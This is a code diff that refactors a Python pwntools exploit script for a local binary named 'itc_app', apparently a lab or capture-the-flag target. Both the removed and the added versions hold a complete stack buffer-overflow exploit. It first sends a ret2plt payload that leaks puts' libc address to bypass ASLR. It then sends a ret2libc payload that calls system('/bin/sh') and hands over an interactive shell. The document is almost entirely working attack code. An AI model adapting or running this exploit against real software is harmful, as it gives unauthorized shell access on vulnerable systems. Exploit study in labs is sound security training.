@@ -1,67 +1,70 @@
-import struct
-from pwn import process, ELF, context
-
-BUFFER = 132
-PUTS_PLT_ADDRESS, MAIN_ADDRESS, PUTS_GOT_ADDRESS = 0x8048340, 0x804847b, 0x80497ac
-
-def main():
-
-    # Set the binary context
-    binary_path = './itc_app'
-
-    # Start the process
-    proc = process()
-
-    # Construct the initial payload
-    payload = (
-        b'A' * BUFFER +
-        struct.pack("I", PUTS_PLT_ADDRESS) +  # puts PLT
-        struct.pack("I", MAIN_ADDRESS) +      # main address
-        struct.pack("I", PUTS_GOT_ADDRESS)    # puts GOT
-    )
-
-    # Send the initial payload
-    proc.sendline(payload)
-
-    WELCOME_DETECTED, LEAKED_ADDRESS = False, None
-
-    # Process output to leak address
-    for _ in range(10):
-        try:
-            line = proc.recvline()
-            print(line)  # Display the line received from the process
-            if WELCOME_DETECTED and b"Welcome" in line:
-                LEAKED_ADDRESS = int.from_bytes(previous_line[:4], byteorder='little')
-                print(f"\033[32mLeaked puts' libc Addr: \033[0m\033[36m{hex(LEAKED_ADDRESS)}\033[0m")
-                libc_base_address = LEAKED_ADDRESS - 0x731b0  # Offset for libc's puts
-                print(f"\033[32mLibc base Addr: \033[0m\033[36m{hex(libc_base_address)}\033[0m")
-                break
-            if b"Welcome" in line:
-                WELCOME_DETECTED = True
-            previous_line = line
-        except EOFError:
-            break
-
-    # Construct and send the final payload if an address was leaked
-    if LEAKED_ADDRESS:
-        final_payload = (
-            b'A' * BUFFER +
-            struct.pack("I", libc_base_address + 0x4c830) +  # libc system offset
-            struct.pack("I", libc_base_address + 0x3c130) +  # libc exit offset
-            struct.pack("I", libc_base_address + 0x1b5fc8)   # libc /bin/sh offset
-        )
-    
-        proc.sendline(final_payload)
-
-        # Interact with the process after sending the final payload
-        proc.interactive()
-
-
-if __name__ == "__main__":
-    main()
-
 """
+Exploits a buffer overflow in 'itc_app' by sending payloads to leak libc addresses and execute a shell.
+
 References:
 - https://docs.pwntools.com/en/stable/
 - https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass
 """
+
+import struct
+import logging
+from pwn import process, ELF, context
+
+# Constants for exploit
+BUFFER_SIZE = 132
+PUTS_PLT_ADDRESS, MAIN_ADDRESS, PUTS_GOT_ADDRESS = 0x8048340, 0x804847b, 0x80497ac
+
+# Configure logging
+logging.basicConfig(level=logging.INFO, format='%(message)s')
+
+
+def construct_payload(buffer_size, *addresses):
+    """Constructs a payload with a repeated 'A' character buffer, followed by the provided addresses."""
+    payload = b'A' * buffer_size
+    for address in addresses:
+        payload += struct.pack("I", address)
+    return payload
+
+
+def exploit(binary_path):
+    """
+    Executes the buffer overflow exploit against a binary specified by `binary_path`.
+
+    :param binary_path: Path to the vulnerable binary.
+    """
+    context.binary = ELF(binary_path)
+    proc = process()
+
+    initial_payload = construct_payload(BUFFER_SIZE, PUTS_PLT_ADDRESS, MAIN_ADDRESS, PUTS_GOT_ADDRESS)
+    proc.sendline(initial_payload)
+
+    welcome_detected, leaked_address = False, None
+    for _ in range(10):
+        try:
+            line = proc.recvline()
+            logging.debug(line)
+            if welcome_detected and b"Welcome" in line:
+                leaked_address = int.from_bytes(previous_line[:4], byteorder='little')
+                libc_base_address = leaked_address - 0x731b0  # Offset for libc's puts
+                logging.info(f"Leaked puts' libc Addr: {hex(leaked_address)}")
+                logging.info(f"Libc base Addr: {hex(libc_base_address)}")
+                break
+            if b"Welcome" in line:
+                welcome_detected = True
+            previous_line = line
+        except EOFError:
+            break
+
+    if leaked_address:
+        final_payload = construct_payload(
+            BUFFER_SIZE,
+            libc_base_address + 0x4c830,  # libc system offset
+            libc_base_address + 0x3c130,  # libc exit offset
+            libc_base_address + 0x1b5fc8   # libc /bin/sh offset
+        )
+        proc.sendline(final_payload)
+        proc.interactive()
+
+
+if __name__ == "__main__":
+    exploit('./itc_app')
